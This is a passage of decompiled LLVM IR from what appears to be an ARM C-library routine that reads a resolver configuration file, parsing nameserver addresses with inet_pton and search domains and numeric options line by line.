  %v2_1c588 = icmp eq i32 %v4_1c584, 0
  br i1 %v2_1c588, label %dec_label_pc_1c594, label %dec_label_pc_1c5c4

dec_label_pc_1c594:                               ; preds = %entry
  %v2_1c598 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1c598, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -32932), i32* %r0.global-to-local, align 4
  %v2_1c5a0 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -32932), i32 %v2_1c598)
  store i32 %v2_1c5a0, i32* %r0.global-to-local, align 4
  %v2_1c5a4 = icmp eq i32 %v2_1c5a0, 0
  %v1_1c5a8 = load i32, i32* @r4, align 4
  %.v1_1c5a8 = select i1 %v2_1c5a4, i32 %tmp38, i32 %v1_1c5a8
  store i32 26492, i32* %r1.global-to-local, align 4
  store i32 %.v1_1c5a8, i32* %r2.global-to-local, align 4
  %v0_1c5b4 = load i32, i32* @r5, align 4
  %v2_1c5b4 = add i32 %v0_1c5b4, 26492
  %v3_1c5b4 = inttoptr i32 %v2_1c5b4 to i32*
  %v4_1c5b4 = load i32, i32* %v3_1c5b4, align 4
  store i32 %v4_1c5b4, i32* %r3.global-to-local, align 4
  %v9_1c5b8 = icmp eq i32 %v4_1c5b4, %.v1_1c5a8
  br i1 %v9_1c5b8, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_1c594
  store i32 %.v1_1c5a8, i32* %v3_1c5b4, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_1c594, %bb
  store i32 116164, i32* @lr, align 4
  %v1_1c5c0 = xor i1 %v9_1c5b8, true
  call void @__pseudo_cond_branch(i1 %v1_1c5c0, i32 ptrtoint (i32* @global_var_1c9d0.1186 to i32))
  %v0_1c5c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c5c4

dec_label_pc_1c5c4:                               ; preds = %entry, %bb58
  %v2_1c5dc = phi i32 [ ptrtoint (i32* @global_var_2947c.811 to i32), %entry ], [ %v0_1c5c8.pre, %bb58 ]
  store i32 27508, i32* %r3.global-to-local, align 4
  %v2_1c5c8 = add i32 %v2_1c5dc, 27508
  %v3_1c5c8 = inttoptr i32 %v2_1c5c8 to i32*
  %v4_1c5c8 = load i32, i32* %v3_1c5c8, align 4
  store i32 %v4_1c5c8, i32* %r3.global-to-local, align 4
  %v2_1c5cc = icmp eq i32 %v4_1c5c8, 0
  br i1 %v2_1c5cc, label %dec_label_pc_1c5d4, label %dec_label_pc_1c968

dec_label_pc_1c5d4:                               ; preds = %dec_label_pc_1c5c4
  %v4_1c5dc = add i32 %v2_1c5dc, 1282
  %v5_1c5dc = inttoptr i32 %v4_1c5dc to i8*
  store i8 5, i8* %v5_1c5dc, align 1
  store i32 -32932, i32* %r0.global-to-local, align 4
  store i32 1283, i32* %r3.global-to-local, align 4
  store i32 -33904, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_1c5f0 = load i32, i32* @r5, align 4
  %v4_1c5f0 = add i32 %v2_1c5f0, 1283
  %v5_1c5f0 = inttoptr i32 %v4_1c5f0 to i8*
  store i8 3, i8* %v5_1c5f0, align 1
  %v0_1c5f4 = load i32, i32* @r5, align 4
  %v1_1c5f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c5f4 = add i32 %v1_1c5f4, %v0_1c5f4
  store i32 %v2_1c5f4, i32* @r0, align 4
  %v1_1c5f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c5f8 = add i32 %v1_1c5f8, %v0_1c5f4
  store i32 %v2_1c5f8, i32* @r1, align 4
  %v2_1c5fc = call i32 @__GI_fopen(i32 %v2_1c5f4, i32 %v2_1c5f8)
  store i32 %v2_1c5fc, i32* %r0.global-to-local, align 4
  store i32 %v2_1c5fc, i32* @fp, align 4
  %v2_1c600 = icmp eq i32 %v2_1c5fc, 0
  br i1 %v2_1c600, label %dec_label_pc_1c88c, label %dec_label_pc_1c834

dec_label_pc_1c60c:                               ; preds = %dec_label_pc_1c834, %dec_label_pc_1c868.backedge
  store i32 %v2_1c868, i32* %r0.global-to-local, align 4
  %v2_1c610 = call i32 @skip_and_NUL_space(i8* %v1_1c610)
  store i32 %v2_1c610, i32* %r0.global-to-local, align 4
  store i32 %v2_1c610, i32* @r4, align 4
  %v0_1c618 = call i32 @skip_nospace()
  store i32 %v0_1c618, i32* %r0.global-to-local, align 4
  %v1_1c61c = inttoptr i32 %v0_1c618 to i8*
  %v2_1c61c = call i32 @skip_and_NUL_space(i8* %v1_1c61c)
  store i32 %v2_1c838, i32* @r1, align 4
  store i32 %v2_1c61c, i32* @r7, align 4
  %v0_1c628 = load i32, i32* @r4, align 4
  store i32 %v0_1c628, i32* %r0.global-to-local, align 4
  %v2_1c62c = inttoptr i32 %v0_1c628 to i8*
  %v3_1c62c = call i32 @__GI_strcoll(i8* %v2_1c62c, i32 %v2_1c838)
  store i32 %v3_1c62c, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1c62c, 16777216
  %v1_1c630 = sdiv i32 %sext, 16777216
  store i32 %v1_1c630, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_1c638, label %dec_label_pc_1c6f4

dec_label_pc_1c638:                               ; preds = %dec_label_pc_1c60c
  %v0_1c638 = load i32, i32* @r7, align 4
  store i32 %v0_1c638, i32* %r0.global-to-local, align 4
  %v0_1c63c = call i32 @skip_nospace()
  %v1_1c63c = inttoptr i32 %v0_1c63c to i8*
  store i32 %v2_1c640, i32* @r4, align 4
  %v0_1c644 = load i32, i32* @r6, align 4
  %v1_1c644 = trunc i32 %v0_1c644 to i8
  store i8 %v1_1c644, i8* %v1_1c63c, align 1
  %v0_1c648 = load i32, i32* @r6, align 4
  store i32 %v0_1c648, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_1c640, i32* %r0.global-to-local, align 4
  %v3_1c654 = call i32 @__GI_memset(i8* %v2_1c654, i32 %v0_1c648)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1c65c = load i32, i32* @r7, align 4
  store i32 %v0_1c65c, i32* %r1.global-to-local, align 4
  store i32 %v2_1c660, i32* %r2.global-to-local, align 4
  %v3_1c664 = inttoptr i32 %v0_1c65c to i8*
  %v4_1c664 = call i32 @inet_pton(i32 10, i8* %v3_1c664, i32 %v2_1c660)
  store i32 %v4_1c664, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_1c664, 1
  br i1 %tmp59, label %dec_label_pc_1c674, label %dec_label_pc_1c690

dec_label_pc_1c674:                               ; preds = %dec_label_pc_1c638
  %v0_1c674 = load i32, i32* @r7, align 4
  store i32 %v0_1c674, i32* %r1.global-to-local, align 4
  store i32 %v2_1c678, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_1c680 = inttoptr i32 %v0_1c674 to i8*
  %v4_1c680 = call i32 @inet_pton(i32 2, i8* %v3_1c680, i32 %v2_1c678)
  store i32 %v4_1c680, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_1c680, 1
  br i1 %tmp60, label %dec_label_pc_1c868.backedge, label %dec_label_pc_1c690

dec_label_pc_1c690:                               ; preds = %dec_label_pc_1c674, %dec_label_pc_1c638
  %v0_1c694.off0 = phi i16 [ 10, %dec_label_pc_1c638 ], [ 2, %dec_label_pc_1c674 ]
  store i32 %v2_1c690, i32* %r2.global-to-local, align 4
  store i16 %v0_1c694.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 27508, i32* @r7, align 4
  %v0_1c6a4 = load i32, i32* @r5, align 4
  %v2_1c6a4 = add i32 %v0_1c6a4, 27508
  %v3_1c6a4 = inttoptr i32 %v2_1c6a4 to i32*
  %v4_1c6a4 = load i32, i32* %v3_1c6a4, align 4
  store i32 27504, i32* @sl, align 4
  %v1_1c6ac = add i32 %v4_1c6a4, 1
  store i32 %v1_1c6ac, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_1c6b4 = mul i32 %v1_1c6ac, 28
  store i32 %v2_1c6b4, i32* %r1.global-to-local, align 4
  %v2_1c6b8 = add i32 %v0_1c6a4, 27504
  %v3_1c6b8 = inttoptr i32 %v2_1c6b8 to i32*
  %v4_1c6b8 = load i32, i32* %v3_1c6b8, align 4
  store i32 %v4_1c6b8, i32* %r0.global-to-local, align 4
  %v2_1c6bc = inttoptr i32 %v4_1c6b8 to i32*
  %v3_1c6bc = call i32 @realloc(i32* %v2_1c6bc, i32 %v2_1c6b4)
  store i32 %v3_1c6bc, i32* %r0.global-to-local, align 4
  store i32 %v3_1c6bc, i32* @r6, align 4
  %v2_1c6c0 = icmp eq i32 %v3_1c6bc, 0
  br i1 %v2_1c6c0, label %dec_label_pc_1c868.backedge, label %dec_label_pc_1c6c8

dec_label_pc_1c6c8:                               ; preds = %dec_label_pc_1c690
  %v0_1c6c8 = load i32, i32* @r5, align 4
  %v1_1c6c8 = load i32, i32* @r7, align 4
  %v2_1c6c8 = add i32 %v1_1c6c8, %v0_1c6c8
  %v3_1c6c8 = inttoptr i32 %v2_1c6c8 to i32*
  %v4_1c6c8 = load i32, i32* %v3_1c6c8, align 4
  store i32 %v4_1c6c8, i32* %r4.global-to-local, align 4
  %v1_1c6cc = load i32, i32* @r8, align 4
  %v3_1c6cc = mul i32 %v1_1c6cc, %v4_1c6c8
  %v4_1c6cc = add i32 %v3_1c6cc, %v3_1c6bc
  store i32 %v4_1c6cc, i32* %lr.global-to-local, align 4
  %v2_1c6d4 = load i16, i16* %stack_var_-68, align 2
  %v3_1c6d4 = sext i16 %v2_1c6d4 to i32
  store i32 %v3_1c6d4, i32* %r0.global-to-local, align 4
  %v6_1c6d4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_1c6d4, i32* %r1.global-to-local, align 4
  %v9_1c6d4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_1c6d4, i32* %r2.global-to-local, align 4
  store i32 %v14_1c6d4, i32* @ip, align 4
  %v2_1c6d8 = load i32, i32* @sl, align 4
  %v3_1c6d8 = add i32 %v2_1c6d8, %v0_1c6c8
  %v4_1c6d8 = inttoptr i32 %v3_1c6d8 to i32*
  store i32 %v3_1c6bc, i32* %v4_1c6d8, align 4
  %v0_1c6dc = load i32, i32* %lr.global-to-local, align 4
  %v1_1c6dc = inttoptr i32 %v0_1c6dc to i32*
  %v2_1c6dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1c6dc, i32* %v1_1c6dc, align 4
  %v3_1c6dc = add i32 %v0_1c6dc, 4
  %v4_1c6dc = inttoptr i32 %v3_1c6dc to i32*
  %v5_1c6dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c6dc, i32* %v4_1c6dc, align 4
  %v6_1c6dc = add i32 %v0_1c6dc, 8
  %v7_1c6dc = inttoptr i32 %v6_1c6dc to i32*
  %v8_1c6dc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1c6dc, i32* %v7_1c6dc, align 4
  %v9_1c6dc = add i32 %v0_1c6dc, 12
  %v10_1c6dc = inttoptr i32 %v9_1c6dc to i32*
  %v11_1c6dc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1c6dc, i32* %v10_1c6dc, align 4
  %v12_1c6dc = add i32 %v0_1c6dc, 16
  store i32 %v12_1c6dc, i32* @lr, align 4
  %v2_1c6e0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_1c6e0, i32* %r0.global-to-local, align 4
  %v0_1c6e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6e4 = add i32 %v0_1c6e4, 1
  store i32 %v1_1c6e4, i32* %r4.global-to-local, align 4
  %v1_1c6e8 = inttoptr i32 %v12_1c6dc to i32*
  store i32 %v2_1c6e0, i32* %v1_1c6e8, align 4
  %v3_1c6e8 = add i32 %v0_1c6dc, 20
  %v4_1c6e8 = inttoptr i32 %v3_1c6e8 to i32*
  %v5_1c6e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c6e8, i32* %v4_1c6e8, align 4
  %v6_1c6e8 = add i32 %v0_1c6dc, 24
  %v7_1c6e8 = inttoptr i32 %v6_1c6e8 to i32*
  %v8_1c6e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1c6e8, i32* %v7_1c6e8, align 4
  %v0_1c6ec = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6ec = load i32, i32* @r5, align 4
  %v2_1c6ec = load i32, i32* @r7, align 4
  %v3_1c6ec = add i32 %v2_1c6ec, %v1_1c6ec
  %v4_1c6ec = inttoptr i32 %v3_1c6ec to i32*
  store i32 %v0_1c6ec, i32* %v4_1c6ec, align 4
  br label %dec_label_pc_1c868.backedge

dec_label_pc_1c868.backedge:                      ; preds = %dec_label_pc_1c790, %dec_label_pc_1c780, %dec_label_pc_1c74c, %dec_label_pc_1c6c8, %dec_label_pc_1c820, %dec_label_pc_1c674, %dec_label_pc_1c690, %dec_label_pc_1c7c8, %dec_label_pc_1c7d0, %dec_label_pc_1c7b4, %dec_label_pc_1c804
  %v0_1c874.pre = load i32, i32* @fp, align 4
  store i32 %v2_1c868, i32* @r4, align 4
  store i32 %v2_1c868, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_1c874.pre, i32* %r2.global-to-local, align 4
  %v3_1c878 = call i32 @fgets(i32 %v2_1c868, i32 128, i32 %v0_1c874.pre)
  store i32 %v3_1c878, i32* %r0.global-to-local, align 4
  %v2_1c87c = icmp eq i32 %v3_1c878, 0
  br i1 %v2_1c87c, label %dec_label_pc_1c884, label %dec_label_pc_1c60c

dec_label_pc_1c6f4:                               ; preds = %dec_label_pc_1c60c
  %v0_1c6f4 = load i32, i32* @r4, align 4
  store i32 %v0_1c6f4, i32* %r0.global-to-local, align 4
  store i32 %v2_1c844, i32* @r1, align 4
  %v2_1c6fc = inttoptr i32 %v0_1c6f4 to i8*
  %v3_1c6fc = call i32 @__GI_strcoll(i8* %v2_1c6fc, i32 %v2_1c844)
  store i32 %v3_1c6fc, i32* %r0.global-to-local, align 4
  %v2_1c700 = icmp eq i32 %v3_1c6fc, 0
  br i1 %v2_1c700, label %dec_label_pc_1c734, label %dec_label_pc_1c708

dec_label_pc_1c708:                               ; preds = %dec_label_pc_1c6f4
  %v0_1c708 = load i32, i32* @r4, align 4
  store i32 %v0_1c708, i32* %r0.global-to-local, align 4
  store i32 %v2_1c850, i32* @r1, align 4
  %v2_1c710 = inttoptr i32 %v0_1c708 to i8*
  %v3_1c710 = call i32 @__GI_strcoll(i8* %v2_1c710, i32 %v2_1c850)
  store i32 %v3_1c710, i32* %r0.global-to-local, align 4
  %v2_1c714 = icmp eq i32 %v3_1c710, 0
  br i1 %v2_1c714, label %dec_label_pc_1c734, label %dec_label_pc_1c7b4

dec_label_pc_1c720:                               ; preds = %dec_label_pc_1c734, %dec_label_pc_1c720.dec_label_pc_1c720_crit_edge
  %v2_1c724 = phi i32 [ %v1_1c738, %dec_label_pc_1c720.dec_label_pc_1c720_crit_edge ], [ %v1_1c73810, %dec_label_pc_1c734 ]
  %v0_1c724 = phi i32 [ %v1_1c740, %dec_label_pc_1c720.dec_label_pc_1c720_crit_edge ], [ %v1_1c74017, %dec_label_pc_1c734 ]
  %v1_1c720 = phi i32 [ %v1_1c720.pre, %dec_label_pc_1c720.dec_label_pc_1c720_crit_edge ], [ 27500, %dec_label_pc_1c734 ]
  %v1_1c724 = phi i32 [ %v0_1c738, %dec_label_pc_1c720.dec_label_pc_1c720_crit_edge ], [ %v0_1c7389, %dec_label_pc_1c734 ]
  %v2_1c720 = add i32 %v1_1c724, %v1_1c720
  %v3_1c720 = inttoptr i32 %v2_1c720 to i32*
  %v4_1c720 = load i32, i32* %v3_1c720, align 4
  store i32 %v4_1c720, i32* %r3.global-to-local, align 4
  %v3_1c724 = add i32 %v1_1c724, %v2_1c724
  %v4_1c724 = inttoptr i32 %v3_1c724 to i32*
  store i32 %v0_1c724, i32* %v4_1c724, align 4
  %v0_1c728 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c728 = load i32, i32* %r2.global-to-local, align 4
  %v4_1c728 = mul i32 %v1_1c728, 4
  %v5_1c728 = add i32 %v4_1c728, %v0_1c728
  %v6_1c728 = inttoptr i32 %v5_1c728 to i32*
  %v7_1c728 = load i32, i32* %v6_1c728, align 4
  store i32 %v7_1c728, i32* @r0, align 4
  %v0_1c72c = call i32 @free()
  store i32 %v0_1c72c, i32* %r0.global-to-local, align 4
  %v0_1c738 = load i32, i32* @r5, align 4
  %v1_1c738 = load i32, i32* @sb, align 4
  %v2_1c738 = add i32 %v1_1c738, %v0_1c738
  %v3_1c738 = inttoptr i32 %v2_1c738 to i32*
  %v4_1c738 = load i32, i32* %v3_1c738, align 4
  store i32 %v4_1c738, i32* %r3.global-to-local, align 4
  %v2_1c73c = icmp eq i32 %v4_1c738, 0
  %v1_1c740 = add i32 %v4_1c738, -1
  store i32 %v1_1c740, i32* %r2.global-to-local, align 4
  br i1 %v2_1c73c, label %dec_label_pc_1c748, label %dec_label_pc_1c720.dec_label_pc_1c720_crit_edge

dec_label_pc_1c720.dec_label_pc_1c720_crit_edge:  ; preds = %dec_label_pc_1c720
  %v1_1c720.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1c720

dec_label_pc_1c734:                               ; preds = %dec_label_pc_1c708, %dec_label_pc_1c6f4
  store i32 27500, i32* @r4, align 4
  %v0_1c7389 = load i32, i32* @r5, align 4
  %v1_1c73810 = load i32, i32* @sb, align 4
  %v2_1c73811 = add i32 %v1_1c73810, %v0_1c7389
  %v3_1c73812 = inttoptr i32 %v2_1c73811 to i32*
  %v4_1c73813 = load i32, i32* %v3_1c73812, align 4
  store i32 %v4_1c73813, i32* %r3.global-to-local, align 4
  %v2_1c73c15 = icmp eq i32 %v4_1c73813, 0
  %v1_1c74017 = add i32 %v4_1c73813, -1
  store i32 %v1_1c74017, i32* %r2.global-to-local, align 4
  br i1 %v2_1c73c15, label %dec_label_pc_1c748, label %dec_label_pc_1c720

dec_label_pc_1c748:                               ; preds = %dec_label_pc_1c720, %dec_label_pc_1c734
  store i32 27500, i32* @r6, align 4
  br label %dec_label_pc_1c74c

dec_label_pc_1c74c:                               ; preds = %dec_label_pc_1c790, %dec_label_pc_1c748
  %v0_1c74c = load i32, i32* @r7, align 4
  store i32 %v0_1c74c, i32* %r0.global-to-local, align 4
  %v0_1c750 = call i32 @skip_nospace()
  store i32 %v0_1c750, i32* %r0.global-to-local, align 4
  %v1_1c754 = inttoptr i32 %v0_1c750 to i8*
  %v2_1c754 = call i32 @skip_and_NUL_space(i8* %v1_1c754)
  store i32 %v2_1c754, i32* %r0.global-to-local, align 4
  %v0_1c758 = load i32, i32* @r5, align 4
  %v1_1c758 = load i32, i32* @sb, align 4
  %v2_1c758 = add i32 %v1_1c758, %v0_1c758
  %v3_1c758 = inttoptr i32 %v2_1c758 to i32*
  %v4_1c758 = load i32, i32* %v3_1c758, align 4
  store i32 %v2_1c754, i32* @r4, align 4
  %tmp69 = mul i32 %v4_1c758, 4
  %v3_1c764 = add i32 %tmp69, 4
  store i32 %v3_1c764, i32* %r1.global-to-local, align 4
  %v1_1c768 = load i32, i32* @r6, align 4
  %v2_1c768 = add i32 %v1_1c768, %v0_1c758
  %v3_1c768 = inttoptr i32 %v2_1c768 to i32*
  %v4_1c768 = load i32, i32* %v3_1c768, align 4
  store i32 %v4_1c768, i32* %r0.global-to-local, align 4
  %v2_1c76c = inttoptr i32 %v4_1c768 to i32*
  %v3_1c76c = call i32 @realloc(i32* %v2_1c76c, i32 %v3_1c764)
  store i32 %v3_1c76c, i32* %r3.global-to-local, align 4
  %v2_1c770 = icmp eq i32 %v3_1c76c, 0
  %v0_1c774 = load i32, i32* @r7, align 4
  store i32 %v0_1c774, i32* %r0.global-to-local, align 4
  %v0_1c778 = load i32, i32* @r4, align 4
  store i32 %v0_1c778, i32* @r7, align 4
  br i1 %v2_1c770, label %dec_label_pc_1c868.backedge, label %dec_label_pc_1c780

dec_label_pc_1c780:                               ; preds = %dec_label_pc_1c74c
  %v1_1c780 = load i32, i32* @r5, align 4
  %v2_1c780 = load i32, i32* @r6, align 4
  %v3_1c780 = add i32 %v2_1c780, %v1_1c780
  %v4_1c780 = inttoptr i32 %v3_1c780 to i32*
  store i32 %v3_1c76c, i32* %v4_1c780, align 4
  %v1_1c784 = inttoptr i32 %v0_1c774 to i8*
  %v2_1c784 = call i32 @__GI_strdup(i8* %v1_1c784)
  store i32 %v2_1c784, i32* %r0.global-to-local, align 4
  %v2_1c788 = icmp eq i32 %v2_1c784, 0
  br i1 %v2_1c788, label %dec_label_pc_1c868.backedge, label %dec_label_pc_1c790

dec_label_pc_1c790:                               ; preds = %dec_label_pc_1c780
  %v0_1c790 = load i32, i32* @r5, align 4
  %v1_1c790 = load i32, i32* @sb, align 4
  %v2_1c790 = add i32 %v1_1c790, %v0_1c790
  %v3_1c790 = inttoptr i32 %v2_1c790 to i32*
  %v4_1c790 = load i32, i32* %v3_1c790, align 4
  store i32 %v4_1c790, i32* %r3.global-to-local, align 4
  %v1_1c794 = load i32, i32* @r6, align 4
  %v2_1c794 = add i32 %v1_1c794, %v0_1c790
  %v3_1c794 = inttoptr i32 %v2_1c794 to i32*
  %v4_1c794 = load i32, i32* %v3_1c794, align 4
  store i32 %v4_1c794, i32* %r2.global-to-local, align 4
  %v1_1c798 = add i32 %v4_1c790, 1
  store i32 %v1_1c798, i32* %r1.global-to-local, align 4
  %v5_1c79c = mul i32 %v4_1c790, 4
  %v6_1c79c = add i32 %v4_1c794, %v5_1c79c
  %v7_1c79c = inttoptr i32 %v6_1c79c to i32*
  store i32 %v2_1c784, i32* %v7_1c79c, align 4
  %v0_1c7a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c7a0 = load i32, i32* @r5, align 4
  %v2_1c7a0 = load i32, i32* @sb, align 4
  %v3_1c7a0 = add i32 %v2_1c7a0, %v1_1c7a0
  %v4_1c7a0 = inttoptr i32 %v3_1c7a0 to i32*
  store i32 %v0_1c7a0, i32* %v4_1c7a0, align 4
  %v0_1c7a4 = load i32, i32* @r4, align 4
  %v1_1c7a4 = inttoptr i32 %v0_1c7a4 to i8*
  %v2_1c7a4 = load i8, i8* %v1_1c7a4, align 1
  %v3_1c7a4 = zext i8 %v2_1c7a4 to i32
  store i32 %v3_1c7a4, i32* %r3.global-to-local, align 4
  %v2_1c7a8 = icmp eq i8 %v2_1c7a4, 0
  br i1 %v2_1c7a8, label %dec_label_pc_1c868.backedge, label %dec_label_pc_1c74c

dec_label_pc_1c7b4:                               ; preds = %dec_label_pc_1c708
  %v0_1c7b4 = load i32, i32* @r4, align 4
  store i32 %v0_1c7b4, i32* %r0.global-to-local, align 4
  %v2_1c7b8 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_1c7b8, i32* @r1, align 4
  %v2_1c7bc = inttoptr i32 %v0_1c7b4 to i8*
  %v3_1c7bc = call i32 @__GI_strcoll(i8* %v2_1c7bc, i32 %v2_1c7b8)
  store i32 %v3_1c7bc, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_1c7bc, 16777216
  %v1_1c7c0 = sdiv i32 %sext2, 16777216
  store i32 %v1_1c7c0, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_1c7c8, label %dec_label_pc_1c868.backedge

dec_label_pc_1c7c8:                               ; preds = %dec_label_pc_1c7b4
  %v0_1c7c8 = load i32, i32* @r7, align 4
  %v2_1c7c8 = icmp eq i32 %v0_1c7c8, 0
  br i1 %v2_1c7c8, label %dec_label_pc_1c868.backedge, label %dec_label_pc_1c7d0

dec_label_pc_1c7d0:                               ; preds = %dec_label_pc_1c7c8
  store i32 %v0_1c7c8, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1c7d8 = call i32 @__GI_strchr(i32 %v0_1c7c8, i32 58)
  store i32 %v2_1c7d8, i32* %r0.global-to-local, align 4
  store i32 %v2_1c7d8, i32* @r6, align 4
  %v3_1c7dc = icmp eq i32 %v2_1c7d8, 0
  br i1 %v3_1c7dc, label %dec_label_pc_1c868.backedge, label %dec_label_pc_1c7e4

dec_label_pc_1c7e4:                               ; preds = %dec_label_pc_1c7d0
  store i32 -32876, i32* %r1.global-to-local, align 4
  %v0_1c7e8 = load i32, i32* @r4, align 4
  %v1_1c7e8 = trunc i32 %v0_1c7e8 to i8
  %v3_1c7e8 = inttoptr i32 %v2_1c7d8 to i8*
  store i8 %v1_1c7e8, i8* %v3_1c7e8, align 1
  %v0_1c7ec = load i32, i32* @r5, align 4
  %v1_1c7ec = load i32, i32* %r1.global-to-local, align 4
  %v2_1c7ec = add i32 %v1_1c7ec, %v0_1c7ec
  store i32 %v2_1c7ec, i32* @r1, align 4
  %v0_1c7f0 = load i32, i32* @r7, align 4
  store i32 %v0_1c7f0, i32* %r0.global-to-local, align 4
  %v2_1c7f4 = inttoptr i32 %v0_1c7f0 to i8*
  %v3_1c7f4 = call i32 @__GI_strcoll(i8* %v2_1c7f4, i32 %v2_1c7ec)
  store i32 %v3_1c7f4, i32* %r0.global-to-local, align 4
  %v2_1c7f8 = icmp eq i32 %v3_1c7f4, 0
  br i1 %v2_1c7f8, label %dec_label_pc_1c820, label %dec_label_pc_1c804

dec_label_pc_1c804:                               ; preds = %dec_label_pc_1c7e4
  %v0_1c808 = load i32, i32* @r7, align 4
  store i32 %v0_1c808, i32* %r0.global-to-local, align 4
  %v0_1c80c = load i32, i32* @r5, align 4
  %v2_1c80c = add i32 %v0_1c80c, -32868
  store i32 %v2_1c80c, i32* @r1, align 4
  %v2_1c810 = inttoptr i32 %v0_1c808 to i8*
  %v3_1c810 = call i32 @__GI_strcoll(i8* %v2_1c810, i32 %v2_1c80c)
  store i32 %v3_1c810, i32* %r0.global-to-local, align 4
  %v2_1c814 = icmp eq i32 %v3_1c810, 0
  br i1 %v2_1c814, label %dec_label_pc_1c820, label %dec_label_pc_1c868.backedge

dec_label_pc_1c820:                               ; preds = %dec_label_pc_1c804, %dec_label_pc_1c7e4
  %storemerge = phi i32 [ 1282, %dec_label_pc_1c7e4 ], [ 1283, %dec_label_pc_1c804 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_1c820 = load i32, i32* @r6, align 4
  %v1_1c820 = add i32 %v0_1c820, 1
  store i32 %v1_1c820, i32* @r0, align 4
  %v0_1c824 = load i32, i32* @r5, align 4
  %v2_1c824 = add i32 %v0_1c824, %storemerge
  store i32 %v2_1c824, i32* @r4, align 4
  %v1_1c828 = call i32 @atol(i32 %v1_1c820)
  %v2_1c828 = trunc i32 %v1_1c828 to i8
  store i32 %v1_1c828, i32* %r0.global-to-local, align 4
  %v3_1c82c = load i32, i32* @r4, align 4
  %v4_1c82c = inttoptr i32 %v3_1c82c to i8*
  store i8 %v2_1c828, i8* %v4_1c82c, align 1
  br label %dec_label_pc_1c868.backedge

dec_label_pc_1c834:                               ; preds = %dec_label_pc_1c5d4
  %v0_1c838 = load i32, i32* @r5, align 4
  %v2_1c838 = add i32 %v0_1c838, -32912
  %v2_1c844 = add i32 %v0_1c838, -32900
  %v2_1c850 = add i32 %v0_1c838, -32892
  %v2_1c85c = add i32 %v0_1c838, -32884
  store i32 %v2_1c85c, i32* %r3.global-to-local, align 4
  store i32 27512, i32* @sb, align 4
  store i32 %v2_1c85c, i32* %stack_var_-560, align 4
  %v2_1c868 = ptrtoint i32* %stack_var_-288 to i32
  %v1_1c610 = bitcast i32* %stack_var_-288 to i8*
  %v2_1c640 = ptrtoint i16* %stack_var_-68 to i32
  %v2_1c654 = bitcast i16* %stack_var_-68 to i8*
  %v2_1c660 = ptrtoint i32* %stack_var_-60 to i32
  %v2_1c678 = ptrtoint i32* %stack_var_-64 to i32
  %v2_1c690 = ptrtoint i32* %stack_var_-304 to i32
  %v14_1c6d4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1c868, i32* @r4, align 4
  store i32 %v2_1c868, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_1c5fc, i32* %r2.global-to-local, align 4
  %v3_1c87866 = call i32 @fgets(i32 %v2_1c868, i32 128, i32 %v2_1c5fc)
  store i32 %v3_1c87866, i32* %r0.global-to-local, align 4
  %v2_1c87c68 = icmp eq i32 %v3_1c87866, 0
  br i1 %v2_1c87c68, label %dec_label_pc_1c884, label %dec_label_pc_1c60c

dec_label_pc_1c884:                               ; preds = %dec_label_pc_1c868.backedge, %dec_label_pc_1c834
  %v0_1c884 = load i32, i32* @fp, align 4
  store i32 %v0_1c884, i32* %r0.global-to-local, align 4
  %v1_1c888 = inttoptr i32 %v0_1c884 to i16*
  %v2_1c888 = call i32 @__GI_fclose(i16* %v1_1c888)
  store i32 %v2_1c888, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c88c

dec_label_pc_1c88c:                               ; preds = %dec_label_pc_1c5d4, %dec_label_pc_1c884
  store i32 27508, i32* %r3.global-to-local, align 4
  %v0_1c890 = load i32, i32* @r5, align 4
  %v2_1c890 = add i32 %v0_1c890, 27508
  %v3_1c890 = inttoptr i32 %v2_1c890 to i32*
  %v4_1c890 = load i32, i32* %v3_1c890, align 4
  store i32 %v4_1c890, i32* %r3.global-to-local, align 4
